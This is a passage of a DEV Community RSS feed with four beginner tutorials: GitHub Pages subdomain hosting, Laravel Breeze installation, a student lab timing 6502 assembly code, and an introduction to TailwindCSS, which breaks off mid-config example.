<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
  <channel>
    <title>DEV Community</title>
    <author>DEV Community</author>
    <description>A constructive and inclusive social network for software developers. With you every step of your journey.</description>
    <link>https://dev.to</link>
    <language>en</language>
    <item>
      <title>How to Host a Site With a Subdomain on GitHub Pages</title>
      <author>Sean Coughlin</author>
      <pubDate>Sun, 23 Jan 2022 20:21:04 +0000</pubDate>
      <link>https://dev.to/scc33/how-to-host-a-site-with-a-subdomain-on-github-pages-5a1j</link>
      <guid>https://dev.to/scc33/how-to-host-a-site-with-a-subdomain-on-github-pages-5a1j</guid>
      <description>&lt;h2&gt;
  &lt;a href="#subdomain-background"&gt;
  &lt;/a&gt;
  Subdomain Background
&lt;/h2&gt;

&lt;p&gt;Have you ever noticed some websites &lt;a href="http://www.seancoughlin.me"&gt;www.seancoughlin.me&lt;/a&gt;, &lt;a href="https://link.seancoughlin.me"&gt;link.seancoughlin.me&lt;/a&gt;, or &lt;a href="https://blog.seancoughlin.me"&gt;blog.seancoughlin.me&lt;/a&gt; have extra text at the front? The first bit of all of these is called a &lt;strong&gt;subdomain&lt;/strong&gt;. &lt;a href="https://en.wikipedia.org/wiki/Subdomain"&gt;Subdomains&lt;/a&gt; are domains that are a part of other domain names. They can be helpful ways of organizing sites and are easier to remember for users.&lt;/p&gt;

&lt;p&gt;GitHub Pages has great support for free website hosting but creates new pages as &lt;code&gt;[username].github.io/example-page&lt;/code&gt; by default. Subdomains are a great way to make the URL easier to understand.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#github-pages-subdomain-tutorial"&gt;
  &lt;/a&gt;
  GitHub Pages Subdomain Tutorial
&lt;/h2&gt;

&lt;p&gt;&lt;em&gt;Note: this tutorial assumes you already have a custom domain setup.&lt;/em&gt; Check &lt;a href="https://docs.github.com/en/pages/configuring-a-custom-domain-for-your-github-pages-site/about-custom-domains-and-github-pages"&gt;GitHub Pages documentation&lt;/a&gt; to setup your custom subdomain.&lt;/p&gt;

&lt;p&gt;First, open your domain name provider and add a CNAME record. A CNAME is an alias for another URL. In the CNAME, add your desired subdomain as the host and username.github.io. as the target. Note the &lt;em&gt;extra dot&lt;/em&gt; after the end of io. For this tutorial, &lt;a href="https://www.namecheap.com"&gt;Namecheap&lt;/a&gt; was my domain name registrar. Creating a CNAME record will look different depending on your domain name provider.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--bfY6PxMi--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1642965712201/mGdUHkY8qK.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--bfY6PxMi--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1642965712201/mGdUHkY8qK.png" alt="CNAME record example" width="880" height="47"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You will be able to see the new subdomain propagate across the world with a tool like &lt;a href="https://www.whatsmydns.net"&gt;https://www.whatsmydns.net&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--1mlNRa34--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1642964303128/tO9DEiSvN.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--1mlNRa34--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1642964303128/tO9DEiSvN.png" alt="DNS propogation" width="880" height="1257"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;We now need to tell GitHub to host our site at the subdomain we just created. Open the repository you would like to host at a subdomain and head to the Pages tab in settings. Select your source branch and type your subdomain in the custom domain field.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--OtNk_DaH--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1642963983042/kg18uFXlf.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--OtNk_DaH--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1642963983042/kg18uFXlf.png" alt="Pages in settings" width="628" height="1336"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Initially, GitHub Pages will throw an error saying the domain name is "improperly configured." This error should resolve itself after a few minutes as the DNS records update. If the error doesn't go away, try editing the custom domain, clicking save, then reverting to your desired custom subdomain. Editing the custom domain will trigger GitHub Pages to recheck the DNS records.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--j_N_DmVo--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1642964231106/D9ZmQQBgZ.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--j_N_DmVo--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1642964231106/D9ZmQQBgZ.png" alt="Add subdomain to GitHub Pages" width="880" height="703"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Once GitHub Pages has verified the DNS records, the website will be live at an HTTP link. Now Pages will automatically certify the site to create a secure HTTPS version. The process completes after a few minutes.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--PrINsCYi--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1642964687361/c_plKr6qZ.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--PrINsCYi--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1642964687361/c_plKr6qZ.png" alt="Certifying for HTTPS" width="880" height="143"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;That's it! Your Pages site is hosted at your custom subdomain.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--Nkuu3OLt--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1642966048549/gM7AIJlu7.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--Nkuu3OLt--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1642966048549/gM7AIJlu7.png" alt="Complete subdomain in GitHub pages" width="880" height="248"&gt;&lt;/a&gt;&lt;/p&gt;

</description>
      <category>tutorial</category>
      <category>github</category>
      <category>webdev</category>
      <category>githubpages</category>
    </item>
    <item>
      <title>Installing Laravel Breeze and a Quick Walkthrough</title>
      <author>Mostafa Said</author>
      <pubDate>Sun, 23 Jan 2022 19:55:28 +0000</pubDate>
      <link>https://dev.to/moose_said/installing-laravel-breeze-and-a-quick-walkthrough-20ej</link>
      <guid>https://dev.to/moose_said/installing-laravel-breeze-and-a-quick-walkthrough-20ej</guid>
      <description>&lt;p&gt;Hello Everyone 👋&lt;/p&gt;

&lt;p&gt;In this article, I'm going to install Laravel Breeze and take you in a very quick tour.&lt;/p&gt;

&lt;p&gt;Laravel Breeze is a very simple implementation of all of Laravel's authentication features, including login, registration, password reset, email verification, and password confirmation.&lt;/p&gt;

&lt;p&gt;Laravel Breeze's default view layer is made up of simple Blade templates styled with Tailwind CSS. I already wrote about installing TailwindCSS in Laravel project and you can check out the article by clicking &lt;a href="https://dev.to/moose_said/installing-tailwind-css-in-your-laravel-project-16f3"&gt;&lt;strong&gt;here&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;This article works as a step by step guide with all the tiny details, so follow along for the best result 👇&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#1-install-nodejs-and-npm"&gt;
  &lt;/a&gt;
  1- Install Nodejs and npm:
&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;First thing you need to make sure that you have Node and npm installed on your machine.&lt;/li&gt;
&lt;li&gt;You can check that by opening up the terminal and type those two commands: &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;npm -v&lt;br&gt;
node -v&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;If you need to install them 🔗 &lt;a href="https://docs.npmjs.com/downloading-and-installing-node-js-and-npm"&gt;DOCs for downloading Node and npm&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;If you got that converged, move on 👇&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--XR2a2ZSu--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1642525051696/mzBBI-k4u.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--XR2a2ZSu--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1642525051696/mzBBI-k4u.png" alt="2 - npm and node install.png" width="868" height="542"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#2-install-database-management-tool"&gt;
  &lt;/a&gt;
  2- Install Database Management Tool:
&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;I use free version of table plus to manage my databases.&lt;/li&gt;
&lt;li&gt;You can download it from here: &lt;a href="https://tableplus.com/"&gt;https://tableplus.com/&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;This really doesn't require any instructions, keep clicking next and leave everything to default settings.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;
  &lt;a href="#3-start-your-laravel-project"&gt;
  &lt;/a&gt;
  3- Start your Laravel Project:
&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;I will use composer to create Laravel project.&lt;/li&gt;
&lt;li&gt;You can download composer from here: &lt;a href="https://getcomposer.org/"&gt;https://getcomposer.org/&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;Open up your terminal and create your Laravel project in the desired directory.&lt;/li&gt;
&lt;li&gt;In my case, I'm just used to create my projects in htdocs folder and name it 'laravue'🤷‍♂️
&lt;/li&gt;
&lt;/ul&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;PS C:\Users\Mostafa's PC&amp;gt; cd C:\xampp\htdocs\
PS C:\xampp\htdocs&amp;gt; composer create-project laravel/laravel laravue
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#4-create-a-database"&gt;
  &lt;/a&gt;
  4- Create a Database:
&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;I will use MySQL Database.&lt;/li&gt;
&lt;li&gt;There are many ways to do that, to know more you can visit &lt;a href="https://www.mysqltutorial.org/mysql-create-database/"&gt;&lt;strong&gt;this link&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;I will create a database using MySQL Command Line Client and name it laravue.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--6Hvbq-6q--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1642962840390/xhq7Tt4Gv.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--6Hvbq-6q--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1642962840390/xhq7Tt4Gv.png" alt="2- Create MySQL Database.png" width="880" height="446"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#5-connect-to-database"&gt;
  &lt;/a&gt;
  5- Connect to Database:
&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Open your Laravel project in the preferred code editor, in my case I will use VS Code.&lt;/li&gt;
&lt;li&gt;Head to your env file in the main Laravel project directory.&lt;/li&gt;
&lt;li&gt;In the below section make sure to update all the info to match your created database.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--JpHeHcDZ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1642963286853/RXVDV1Pl3.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--JpHeHcDZ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1642963286853/RXVDV1Pl3.png" alt="2- ENV file update.png" width="880" height="548"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Open table plus -&amp;gt; click on 'Create new connection' -&amp;gt; MySQL.&lt;/li&gt;
&lt;li&gt;Fill in the fields with the info you just created.&lt;/li&gt;
&lt;li&gt;You can name the connection with anything you want.&lt;/li&gt;
&lt;li&gt;After filling the fields click test then connect.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--pXv6ver3--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1642963666848/d63sGeuWY.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--pXv6ver3--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1642963666848/d63sGeuWY.png" alt="4- Table plus config.png" width="521" height="555"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#6-install-laravel-breeze"&gt;
  &lt;/a&gt;
  6- Install Laravel Breeze:
&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Run the below commands in order and insure that you leave them run till they finish.&lt;/li&gt;
&lt;li&gt;Make sure you run your commands in the project directory. In my case, htdocs\laravue.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--N4nqi5Sm--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1642964173341/ojxlUfmaf.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--N4nqi5Sm--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1642964173341/ojxlUfmaf.png" alt="4- Breeze Instaal.png" width="880" height="310"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#7-npm-and-migration"&gt;
  &lt;/a&gt;
  7- NPM and migration:
&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Now, lets run the below commands in the terminal which combines all JavaScript files into a browser-friendly combined file.&lt;/li&gt;
&lt;li&gt;It may take few minutes, depends on your machine's speed to process the action but you need to leave it till it finishes.&lt;/li&gt;
&lt;li&gt;Then make our migrations.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--KCNIHjKH--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1642964669221/royouNO8u.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--KCNIHjKH--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1642964669221/royouNO8u.png" alt="5- NPM.png" width="880" height="396"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#7-finishing"&gt;
  &lt;/a&gt;
  7- Finishing:
&lt;/h3&gt;

&lt;h3&gt;
  &lt;a href="#finally-were-done"&gt;
  &lt;/a&gt;
  FINALLY we're done 🥳🥳
&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;If you go to the terminal and in your directory run (php artisan serve) command, you will see that you have a nav bar already to login and register the user and it's perfectly styled with tailwind. 

&lt;ul&gt;
&lt;li&gt;Try it on registering a new user then run your migration again (php artisan migrate) then open table plus and have a look at your first user in database.&lt;/li&gt;
&lt;li&gt;If you have a look at your routes in 'resources\web.php' you'll find the route for the dashboard that only logged in user can visit.&lt;/li&gt;
&lt;li&gt;To have a clearer look you can head to 'resources\auth.php' and there you'll see that Laravel Breeze creates all the necessary routes for authentications.&lt;/li&gt;
&lt;li&gt;Do you want to have a look on the login and register forms? head to 'resources\views\auth'.&lt;/li&gt;
&lt;li&gt;Do you want to have a look on the logout form ? Head to 'resources\views\layouts\navigation.blade.php'.&lt;/li&gt;
&lt;li&gt;Do you want to have a look on Auth controllers? Head to 'app\Http\Controllers\Auth'.&lt;/li&gt;
&lt;/ul&gt;


&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;What's so beautiful about it is that you can see how Laravel team implemented the authentications and routes and you can change them if you like. Also you can change the design with tailwind CSS or even any other method you want.&lt;/p&gt;

&lt;p&gt;In case you need a full walkthrough video about Laravel Breeze and how to use it properly in a project and get the best benefits out of it, please let me know in the comments and I will start working on it right away 🤓&lt;/p&gt;

&lt;p&gt;Thank you all for reading this article. You can follow me on twitter for such useful content &lt;a href="https://twitter.com/Moose_Said"&gt;Moose_Said&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;If you like the article please share it, love it, marry it or whatever, but most importantly let me know 😅&lt;/p&gt;

</description>
      <category>laravel</category>
      <category>webdev</category>
      <category>tutorial</category>
      <category>backend</category>
    </item>
    <item>
      <title>Software Portability and Optimization</title>
      <author>Anatoliy Serputov</author>
      <pubDate>Sun, 23 Jan 2022 19:43:31 +0000</pubDate>
      <link>https://dev.to/aserputov/software-portability-and-optimization-2cja</link>
      <guid>https://dev.to/aserputov/software-portability-and-optimization-2cja</guid>
      <description>&lt;h2&gt;
  &lt;a href="#introduction"&gt;
  &lt;/a&gt;
  Introduction
&lt;/h2&gt;

&lt;p&gt;Today, I will discuss my first experience working on &lt;a href="https://wiki.cdot.senecacollege.ca/wiki/6502"&gt;6502&lt;/a&gt; Emulator.&lt;/p&gt;

&lt;p&gt;The &lt;a href="https://wiki.cdot.senecacollege.ca/wiki/6502"&gt;6502&lt;/a&gt; is an 8-bit processor with a 16-bit address bus. It is, therefore, able to access 64 kilobytes (216 bytes). Since each 16-bit address is comprised of two 8-bit bytes, memory can be viewed as 256 pages of 256 bytes each.&lt;/p&gt;

&lt;p&gt;We have two tasks to do:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Calculate how long it takes for the code to execute, assuming a 1 MHz clock speed?&lt;/p&gt;

&lt;p&gt;Calculate the execution time of the fastest version of this program that you can create?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3&gt;
  &lt;a href="#calculate-how-long-it-takes-for-the-code-to-execute-assuming-a-1-mhz-clock-speed"&gt;
  &lt;/a&gt;
  Calculate how long it takes for the code to execute, assuming a 1 MHz clock speed?
&lt;/h3&gt;

&lt;p&gt;First of all, below, you can see the code I'm about to work with and count how long it takes to execute it.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;    lda #$00    ; set a pointer at $40 to point to $0200
    sta $40
    lda #$02
    sta $41

    lda #$07    ; colour number

    ldy #$00    ; set index to 0

loop:   sta ($40),y ; set pixel at the address (pointer)+Y

    iny     ; increment index
    bne loop    ; continue until done the page

    inc $41     ; increment the page
    ldx $41     ; get the current page number
    cpx #$06    ; compare with 6
    bne loop    ; continue until done all pages
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;To calculate this code, we will need &lt;a href="https://www.masswerk.at/6502/6502_instruction_set.html#BNE"&gt;special&lt;/a&gt; docs with the time of each command execution. &lt;/p&gt;

&lt;p&gt;I've decided to share my calculation via a photo of excel because it seems more informational.&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--oA-g2k22--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/qkhgkhhyekii9earb204.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--oA-g2k22--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/qkhgkhhyekii9earb204.png" alt="Image description" width="880" height="781"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;
  &lt;a href="#calculate-the-execution-time-of-the-fastest-version-of-this-program-"&gt;
  &lt;/a&gt;
  Calculate the execution time of the fastest version of this program ?
&lt;/h3&gt;

&lt;p&gt;I tried to optimize code and decided to see how different our professor did the same work in class. Code below.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;    LDA #$00
    STA $10
    LDY #$02
    STA $11

    LDA #$07
    LDY #$00    

LOOP:   STA ($10),Y
    INY 
    BNE LOOP

    INC $11
    LDX #$06
    CPX $11
    BNE LOOP
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;I didn't find what I could change to make the first code faster, but I think this code can execute in fewer cycles after I did small calculations. &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h2&gt;

&lt;p&gt;While working on these experiments, I did solve a minor bug in Assembly Compiler. See the &lt;a href="https://github.com/ctyler/6502js/pull/2"&gt;Link&lt;/a&gt; to the pull request.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;⚠️ Second Blog Post: &lt;a href="https://dev.tourl"&gt;Link&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2&gt;
  &lt;a href="#links"&gt;
  &lt;/a&gt;
  Links
&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;🖇 git &lt;a href="https://github.com/aserputov"&gt;https://github.com/aserputov&lt;/a&gt;&lt;br&gt;
🖇 twitter &lt;a href="https://twitter.com/aserputov%5C"&gt;https://twitter.com/aserputov\&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;em&gt;p.s This post was made for my SPO class Lab 2 assignment&lt;/em&gt;&lt;/p&gt;

</description>
    </item>
    <item>
      <title>Getting Started with TailwindCSS</title>
      <author>Tijani Ayomide</author>
      <pubDate>Sun, 23 Jan 2022 19:42:11 +0000</pubDate>
      <link>https://dev.to/nobletijan/getting-started-with-tailwindcss-28ie</link>
      <guid>https://dev.to/nobletijan/getting-started-with-tailwindcss-28ie</guid>
      <description>&lt;p&gt;You must have heard about "&lt;strong&gt;tailwindcss&lt;/strong&gt;" but you might not know what it does or how to use it... in this article, I will share with you what &lt;strong&gt;tailwindcss&lt;/strong&gt; is all about, why it's been used, and maybe if its a component library you would probably use.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#what-is-tailwindcss"&gt;
  &lt;/a&gt;
  What is TailwindCSS
&lt;/h2&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--sNhOq_dO--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/cc9w4whqlm0in8asfpgz.gif" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--sNhOq_dO--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/cc9w4whqlm0in8asfpgz.gif" alt="Question" width="200" height="200"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Tailwind CSS is self-described as a utility first CSS framework. Rather than focusing on the functionality of the item being styled, Tailwind is centered around how it should be displayed.&lt;br&gt;&lt;br&gt;
Your Friendly Search Engine &lt;strong&gt;Google&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;In simpler terms what Google is trying to say &lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Tailwind CSS is a utility-based first-class framework that uses classes like flex, text-center, pt- 4, and many more to build any design without leaving your HTML code.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;You read that correctly, yes you can style and build design within your HTML code without CSS. There is a saying that all &lt;strong&gt;Software Engineers&lt;/strong&gt; want a tool that can perform the 80/20 rule, which is 80% output with 20% of work. &lt;/p&gt;

&lt;p&gt;Hence tailwind testing the reality of the rule... Note that tailwind isn't going to take over other big frameworks like Bootstrap and other CSS frameworks. In fact, tailwind is much lower-level than Bootstrap as it makes use of utility classes, whereas bootstrap has ready-built components like cards, navigation's e.t.c. Creating cards in tailwind would probably go in this format&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;class = "rounded shadow p-2 bg-white w-34 h-24"

// Rounded - To give the card rounded borders
// p-2 - To give padding
// bg-white - To give a background color of white
// shadow - To give the card a shadow
// And other utility functions to customize your content
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#why-use-tailwindcss"&gt;
  &lt;/a&gt;
  Why use TailwindCSS?
&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;strong&gt;Faster CSS Styling&lt;/strong&gt;💨&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;When it comes to styling HTML there is no faster framework than Tailwind as a result, you can easily create good-looking designs and layouts by styling elements directly. This is possible because of Tailwind's built-in classes. Therefore, you don't have to write your CSS rules yourself. These CSS classes are the main reason why building and styling with Tailwind are so fast.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;strong&gt;Styling control&lt;/strong&gt;🕹️&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;TailwindCSS doesn't define the way your component looks. You define each component/layer by combining different utility classes together. For example, you can give different sections/div a different look, tailwind is one of those frameworks that isn't opinionated on how you should style your project.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Since it is a utility class-based framework you can build your custom designs without writing CSS the traditional approach.. you know the old ways of doing things ( just joking 😅)
&lt;/li&gt;
&lt;/ul&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;.body{
         background-color: white;
         padding: 0px;
         margin: 0px;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Beginner Friendly&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#prerequisites"&gt;
  &lt;/a&gt;
  Prerequisites
&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Basic knowledge of HTML &amp;amp; CSS 🧱&lt;/li&gt;
&lt;li&gt;Zeal to make your Frontend more appealing to the eyes 👀&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#installation-configuration-and-usage"&gt;
  &lt;/a&gt;
  Installation, Configuration, and Usage 🛠️
&lt;/h2&gt;

&lt;p&gt;Let's look at the two most used methods of installing Tailwindcss. &lt;strong&gt;TailwindCLI &amp;amp; TailwindCDN&lt;/strong&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#1-tailwind-cli"&gt;
  &lt;/a&gt;
  1. Tailwind CLI
&lt;/h2&gt;

&lt;p&gt;To Install tailwind and create tailwind.config.js file we have to make use of npm(Node Package Manager) so if you don't have npm installed you can download it &lt;a href="https://nodejs.org/en/"&gt;here&lt;/a&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;// Initialize npm
npm init -y

// In your terminal
npm install tailwindcss
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Once that is installed let's also run&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;npx install tailwindcss init --full
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;What this will do is to generate a Tailwind config file for your project using the Tailwind CLI utility in your root directory. &lt;strong&gt;Why❓&lt;/strong&gt; because by default, Tailwind will look for an optional tailwind.config.js file at the root of your project where you can define any customization's.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;# tailwindcss.config.js
# You should see something like this in your config file... but it should be more than 900lines 😅

module.exports = {
  content: ['./src/**/*.{html,js}'],
  theme: {
    colors: {
      'blue': '#1fb6ff',
      'purple': '#7e5bef',
      'pink': '#ff49db',
      'orange': '#ff7849',
